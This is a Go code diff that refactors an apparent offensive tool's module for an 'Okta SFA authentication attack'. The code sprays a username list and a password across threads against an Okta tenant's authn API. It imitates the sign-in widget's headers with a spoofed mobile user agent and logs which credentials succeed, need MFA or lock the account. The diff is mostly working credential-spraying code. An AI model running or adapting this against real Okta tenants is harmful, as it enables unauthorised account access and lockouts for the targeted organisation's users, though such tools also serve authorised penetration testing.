@@ -5,20 +5,22 @@ import (
 	"strings"
 	"time"
 
-	"dauthi/utils"
+	"github.com/mr-pmillz/dauthi/utils"
 )
 
-type mdma struct {
-	opts utils.ChargeOpts
-	logr *utils.Logger
-	cycle
+// MDMA ...
+type MDMA struct {
+	Opts utils.ChargeOpts
+	Logr *utils.Logger
+	Cycle
 }
 
-type cycle struct {
-	buff   *chan bool
-	block  *chan bool
-	length int
-	api    *utils.API
+// Cycle ...
+type Cycle struct {
+	Buff   *chan bool
+	Block  *chan bool
+	Length int
+	API    *utils.API
 }
 
 const (
@@ -30,27 +32,28 @@ const (
 	// Methods are available tool methods
 	Methods = `
   MFA Methods:
-    auth-okta              Okta SFA authentication attack
+    Auth-okta              Okta SFA authentication attack
 	`
 
 	oktaAuthAPI = `https://%s.okta.com/api/v1/authn`
 
 	oktaAuthPOST = `{"options": {"warnBeforePasswordExpired": true, "multiOptionalFactorEnroll": true}, ` +
 		`"subdomain": "%s", "username": "%s", "password": "%s"}`
+	_authOkta = "Auth-okta"
 )
 
-// Init mdma with default values and return obj
-func Init(o utils.ChargeOpts) *mdma {
+// Init MDMA with default values and return obj
+func Init(o utils.ChargeOpts) *MDMA {
 	if o.Agent == "" {
 		o.Agent = "Agent/20.08.0.23/Android/11"
 	}
 	log := utils.NewLogger("multi-factor")
 
-	return &mdma{
-		opts: o,
-		logr: log,
-		cycle: cycle{
-			api: &utils.API{
+	return &MDMA{
+		Opts: o,
+		Logr: log,
+		Cycle: Cycle{
+			API: &utils.API{
 				Debug: o.Debug,
 				Log:   log,
 				Proxy: o.Proxy},
@@ -58,29 +61,29 @@ func Init(o utils.ChargeOpts) *mdma {
 	}
 }
 
-// clone() copies an *mdma for process threading
-func (m *mdma) clone() *mdma {
-	clone := Init(m.opts) // assign target
-	clone.cycle.block = m.cycle.block
-	clone.cycle.buff = m.cycle.buff
+// Clone copies an *MDMA for process threading
+func (m *MDMA) Clone() *MDMA {
+	clone := Init(m.Opts) // assign target
+	clone.Cycle.Block = m.Cycle.Block
+	clone.Cycle.Buff = m.Cycle.Buff
 
 	return clone
 }
 
-// Wrapper to parse JSON/XML objects
-func (m *mdma) parser(data interface{}, p string) bool {
+// Parser wrapper to parse JSON/XML objects
+func (m *MDMA) Parser(data interface{}, p string) bool {
 	switch p {
 	case "json":
-		err := m.cycle.api.Resp.ParseJSON(data)
+		err := m.Cycle.API.Resp.ParseJSON(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 
 	case "xml":
-		err := m.cycle.api.Resp.ParseXML(data)
+		err := m.Cycle.API.Resp.ParseXML(data)
 		if err != nil {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
 			return true
 		}
 	}
@@ -88,130 +91,130 @@ func (m *mdma) parser(data interface{}, p string) bool {
 	return false
 }
 
-func (m *mdma) auth() {
+// Auth ...
+func (m *MDMA) Auth() {
 	var file []byte
 	var err error
 
-	if m.opts.File != "" {
-		file, err = utils.ReadFile(m.opts.File)
+	if m.Opts.File != "" {
+		file, err = utils.ReadFile(m.Opts.File)
 		if err != nil {
-			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
+			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
 		}
 	}
 
 	lines := strings.Split(string(file), "\n")
-	block := make(chan bool, m.opts.Threads)
+	block := make(chan bool, m.Opts.Threads)
 	buff := make(chan bool, len(lines))
-	m.cycle.block = &block
-	m.cycle.buff = &buff
-	m.cycle.length = len(lines)
+	m.Cycle.Block = &block
+	m.Cycle.Buff = &buff
+	m.Cycle.Length = len(lines)
 
-	m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)
+	m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)
 
 	for _, line := range lines {
 		if len(lines) > 1 && line == "" {
-			*m.cycle.buff <- false
+			*m.Cycle.Buff <- false
 			continue
 		}
 
-		target := m.clone() // assign target
+		target := m.Clone() // assign target
 
 		if line == "" {
-			line = target.opts.UserName
+			_ = target.Opts.UserName
 		} else {
-			target.opts.UserName = line
+			target.Opts.UserName = line
 		}
 
-		switch m.opts.Method {
-		case "auth-okta":
-			target.cycle.api.Name = target.opts.Method
-			target.cycle.api.URL = fmt.Sprintf(oktaAuthAPI, target.opts.Endpoint)
-			target.cycle.api.Data = fmt.Sprintf(oktaAuthPOST, target.opts.Endpoint, target.opts.UserName, target.opts.Password)
-			target.cycle.api.Method = `POST`
-			target.cycle.api.Opts = &map[string]interface{}{
+		switch m.Opts.Method {
+		case _authOkta:
+			target.Cycle.API.Name = target.Opts.Method
+			target.Cycle.API.URL = fmt.Sprintf(oktaAuthAPI, target.Opts.Endpoint)
+			target.Cycle.API.Data = fmt.Sprintf(oktaAuthPOST, target.Opts.Endpoint, target.Opts.UserName, target.Opts.Password)
+			target.Cycle.API.Method = `POST`
+			target.Cycle.API.Opts = &map[string]interface{}{
 				"Header": map[string][]string{
 					"X-Requested-With":           []string{"XMLHttpRequest"},
 					"X-Okta-User-Agent-Extended": []string{"okta-signin-widget-5.14.1"},
-					"User-Agent":                 []string{target.opts.Agent},
+					"User-Agent":                 []string{target.Opts.Agent},
 					"Accept":                     []string{"application/json"},
 					"Content-Type":               []string{"application/json"}}}
 
 		default:
-			m.logr.Failf([]interface{}{m.opts.Method}, "Unknown Method Called")
+			m.Logr.Failf([]interface{}{m.Opts.Method}, "Unknown Method Called")
 		}
-		target.thread()
+		target.Thread()
 	}
 
-	for i := 0; i < m.cycle.length; i++ {
-		<-*m.cycle.buff
+	for i := 0; i < m.Cycle.Length; i++ {
+		<-*m.Cycle.Buff
 	}
-	close(*m.cycle.block)
-	close(*m.cycle.buff)
+	close(*m.Cycle.Block)
+	close(*m.Cycle.Buff)
 }
 
-// thread represents the threading process to loop multiple requests
-func (m *mdma) thread() {
-	*m.cycle.block <- true
+// Thread represents the threading process to loop multiple requests
+func (m *MDMA) Thread() {
+	*m.Cycle.Block <- true
 	go func() {
-		m.cycle.api.WebCall()
+		m.Cycle.API.WebCall()
 
-		if m.cycle.api.Resp.Status == 0 {
-			if m.opts.Miss < m.opts.Retry {
-				m.opts.Miss++
-				m.logr.Infof([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
-				<-*m.cycle.block
-				m.thread()
+		if m.Cycle.API.Resp.Status == 0 {
+			if m.Opts.Miss < m.Opts.Retry {
+				m.Opts.Miss++
+				m.Logr.Infof([]interface{}{m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
+				<-*m.Cycle.Block
+				m.Thread()
 				return
 			}
-			m.logr.Failf([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Null Server Response")
+			m.Logr.Failf([]interface{}{m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Null Server Response")
 		}
-		m.validate()
+		m.Validate()
 
-		// Sleep interval through thread loop
-		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
-		<-*m.cycle.block
-		*m.cycle.buff <- true
+		// Sleep interval through Thread loop
+		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
+		<-*m.Cycle.Block
+		*m.Cycle.Buff <- true
 	}()
 }
 
-func (m *mdma) validate() {
-	switch m.opts.Method {
-	case "auth-okta":
+func (m *MDMA) Validate() {
+	if m.Opts.Method == _authOkta {
 		var check struct {
 			Status string `json:"status"`
 			Error  string `json:"errorSummary"`
 		}
-		if m.parser(&check, "json") {
+		if m.Parser(&check, "json") {
 			return
 		}
-
 		if check.Status != "" {
-			if check.Status == "MFA_ENROLL" {
-				m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful - MFA REQUIRED")
-			} else if check.Status == "LOCKED_OUT" {
-				m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Failed - Account Locked")
-			} else {
-				m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful")
+			switch {
+			case check.Status == "MFA_ENROLL":
+				m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Successful - MFA REQUIRED")
+			case check.Status == "LOCKED_OUT":
+				m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Failed - Account Locked")
+			default:
+				m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Authentication Successful")
 			}
 		} else {
-			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "%s", check.Error)
+			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "%s", check.Error)
 		}
 	}
 }
 
 // Call represents the switch function for activating all class methods
-func (m *mdma) Call() {
-	switch m.opts.Method {
-	case "auth-okta":
-		if m.opts.Email == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
+func (m *MDMA) Call() {
+	switch m.Opts.Method {
+	case _authOkta:
+		if m.Opts.Email == "" && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
 			return
 		}
-		m.opts.UserName = m.opts.Email
-		m.auth()
+		m.Opts.UserName = m.Opts.Email
+		m.Auth()
 
 	default:
-		m.logr.StdOut(Methods)
-		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
+		m.Logr.StdOut(Methods)
+		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
 	}
 }
